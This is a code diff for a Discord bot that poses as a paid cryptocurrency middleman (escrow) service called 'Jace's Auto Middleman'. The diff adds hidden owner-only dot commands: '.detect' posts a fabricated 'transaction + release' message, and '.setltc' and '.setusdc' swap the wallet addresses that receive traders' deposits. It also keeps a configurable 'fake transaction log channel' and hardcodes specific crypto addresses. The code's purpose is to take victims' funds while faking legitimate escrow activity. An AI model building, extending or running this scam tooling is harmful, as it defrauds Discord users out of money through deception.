@@ -30,8 +30,11 @@ const client = new Client({
 });
 
 const OWNER_ID = process.env.OWNER_ID;
-const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
-const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';
+const DEFAULT_LTC = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
+const DEFAULT_USDC = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';
+
+let LTC_ADDRESS = DEFAULT_LTC;
+let USDC_ADDRESS = DEFAULT_USDC;
 
 const confirmedInteractions = new Set();
 const activeTurns = new Map();
@@ -44,6 +47,10 @@ function loadConfig() {
     if (logRow) logChannelId = logRow.value;
     const catRow = db.prepare("SELECT value FROM config WHERE key='panelCategory'").get();
     if (catRow) panelCategoryId = catRow.value;
+    const ltcRow = db.prepare("SELECT value FROM config WHERE key='ltcAddress'").get();
+    if (ltcRow) LTC_ADDRESS = ltcRow.value;
+    const usdcRow = db.prepare("SELECT value FROM config WHERE key='usdcAddress'").get();
+    if (usdcRow) USDC_ADDRESS = usdcRow.value;
   } catch (e) {
     console.log('Config load error:', e.message);
   }
@@ -122,7 +129,6 @@ setInterval(() => {
 const commands = [
   new SlashCommandBuilder().setName('panel').setDescription('Spawn the middleman panel'),
   new SlashCommandBuilder().setName('logchannel').setDescription('Set fake transaction log channel').addStringOption(opt => opt.setName('id').setDescription('Channel ID').setRequired(true)),
-  new SlashCommandBuilder().setName('transaction').setDescription('Trigger fake transaction and release').addStringOption(opt => opt.setName('id').setDescription('Channel ID').setRequired(true)),
   new SlashCommandBuilder().setName('panelcategory').setDescription('Set ticket category').addStringOption(opt => opt.setName('id').setDescription('Category ID').setRequired(true)),
   new SlashCommandBuilder().setName('close').setDescription('Close this ticket')
 ].map(cmd => cmd.toJSON());
@@ -137,6 +143,36 @@ client.once(Events.ClientReady, async () => {
     console.log('Commands deployed');
   } catch (err) {
     console.error('Command deploy error:', err.message);
+  }
+});
+
+client.on(Events.MessageCreate, async (message) => {
+  if (message.author.bot) return;
+  if (message.author.id !== OWNER_ID) return;
+  if (!message.content.startsWith('.')) return;
+  
+  const args = message.content.slice(1).trim().split(/ +/);
+  const command = args.shift().toLowerCase();
+  
+  if (command === 'detect') {
+    const channelId = args[0];
+    if (!channelId) return message.reply('❌ Provide channel ID: `.detect (channelid)`');
+    await sendFakeLog(channelId, true);
+    await message.reply(`✅ Fake transaction + release triggered in <#${channelId}>`);
+  }
+  else if (command === 'setltc') {
+    const address = args[0];
+    if (!address) return message.reply('❌ Provide address: `.setltc (address)`');
+    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('ltcAddress', ?)").run(address);
+    LTC_ADDRESS = address;
+    await message.reply('✅ LTC address updated for all tickets');
+  }
+  else if (command === 'setusdc') {
+    const address = args[0];
+    if (!address) return message.reply('❌ Provide address: `.setusdc (address)`');
+    db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('usdcAddress', ?)").run(address);
+    USDC_ADDRESS = address;
+    await message.reply('✅ USDC address updated for all tickets');
   }
 });
 
@@ -167,26 +203,33 @@ async function handleSlashCommand(interaction) {
       .setTitle("Jace's Auto Middleman")
       .setDescription('• Paid Service\n• Read our ToS before using the bot: <#tos-crypto>')
       .setColor(0x2B2D31);
+    
     const tutorialRow = new ActionRowBuilder().addComponents(
       new ButtonBuilder().setLabel('Tutorial').setStyle(ButtonStyle.Link).setURL('https://example.com').setEmoji('🔗')
     );
+    
     const feesEmbed = new EmbedBuilder()
       .setTitle('Fees:')
       .setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**')
       .setColor(0x2B2D31);
+    
     const ltcEmbed = new EmbedBuilder()
       .setTitle('• Request Litecoin •')
       .setColor(0x2B2D31);
+    
     const ltcRow = new ActionRowBuilder().addComponents(
       new ButtonBuilder().setCustomId('request_ltc').setLabel('Request LTC').setStyle(ButtonStyle.Primary).setEmoji('🪙')
     );
+    
     const usdtEmbed = new EmbedBuilder()
       .setTitle('• Request USDT [BEP-20] •')
       .setDescription('• Network: **BSC (BEP-20)**')
       .setColor(0x2B2D31);
+    
     const usdtRow = new ActionRowBuilder().addComponents(
       new ButtonBuilder().setCustomId('request_usdt').setLabel('Request USDT [BEP-20]').setStyle(ButtonStyle.Success).setEmoji('💵')
     );
+    
     await interaction.reply({ embeds: [mainEmbed, feesEmbed, ltcEmbed], components: [tutorialRow, ltcRow] });
     await interaction.channel.send({ embeds: [usdtEmbed], components: [usdtRow] });
   }
@@ -196,11 +239,6 @@ async function handleSlashCommand(interaction) {
     db.prepare("INSERT OR REPLACE INTO config(key, value) VALUES('logChannel', ?)").run(id);
     logChannelId = id;
     await interaction.reply({ content: '✅ Log channel set', flags: MessageFlags.Ephemeral });
-  }
-  else if (commandName === 'transaction') {
-    if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
-    await sendFakeLog(interaction.options.getString('id'), true);
-    await interaction.reply({ content: '✅ Fake transaction triggered', flags: MessageFlags.Ephemeral });
   }
   else if (commandName === 'panelcategory') {
     if (interaction.user.id !== OWNER_ID) return interaction.reply({ content: '❌ Owner only', flags: MessageFlags.Ephemeral });
@@ -295,7 +333,6 @@ async function handleTradeDetailsModal(interaction) {
     
     let otherUserId = rawInput.replace(/[<@!>]/g, '');
     
-    // Try to resolve by username if not pure ID
     if (!/^\d{17,19}$/.test(otherUserId)) {
       try {
         const members = await interaction.guild.members.fetch({ query: rawInput, limit: 1 });
@@ -307,7 +344,6 @@ async function handleTradeDetailsModal(interaction) {
       }
     }
     
-    // Validate ID format
     if (!/^\d{17,19}$/.test(otherUserId)) {
       return interaction.reply({ content: `❌ Invalid user format: "${rawInput}". Use ID or username.`, flags: MessageFlags.Ephemeral });
     }
